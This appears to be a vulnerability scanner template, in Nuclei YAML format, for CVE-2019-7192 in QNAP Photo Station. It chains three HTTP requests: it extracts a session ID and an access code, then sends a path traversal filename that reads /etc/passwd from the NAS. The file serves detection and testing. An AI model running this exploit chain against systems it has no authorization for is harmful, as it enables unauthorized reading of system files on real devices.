id: cve-2019-7192

description: |
  QNAP NAS Photo Station arbitrary file read vulnerability in the filename parameter of the video.php file.

info:
  name: QNAP NAS Photo Station Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-read,qnap
  reference:
    - https://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html

variables:
  album: "{{rand_base(6)}}"

flow: |
  http(1) && http(2) && http(3)

http:
  - id: step-1
    method: POST
    path:
      - "{{BaseURL}}/photo/p/api/album.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "a=setSlideshow&f=qsamplealbum"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "QDocRoot"
    extractors:
      - type: regex
        name: album
        group: 1
        regex:
          - "output>(.*?)</outp"
      - type: regex
        name: session
        internal: true
        group: 1
        regex:
          - "QMS_SID=(.+?);"

  - id: step-2
    method: GET
    path:
      - "{{BaseURL}}/photo/slideshow.php?album={{album}}"
    headers:
      Cookie: "PHPSESSID={{session}};QMS_SID={{session}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "nas"
    extractors:
      - type: regex
        name: ac
        internal: true
        group: 1
        regex:
          - "encodeURIComponent\\(\\'(.*?)\\'\\)"

  - id: step-3
    method: POST
    path:
      - "{{BaseURL}}/photo/p/api/video.php"
    headers:
      Cookie: "PHPSESSID={{session}};QMS_SID={{session}}"
      Content-Type: application/x-www-form-urlencoded
    body: "album={{album}}&a=caption&ac={{ac}}&f=&filename=../../../../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "filename="
      - type: regex
        part: body
        regex:
          - ":/bin/\\w*sh"
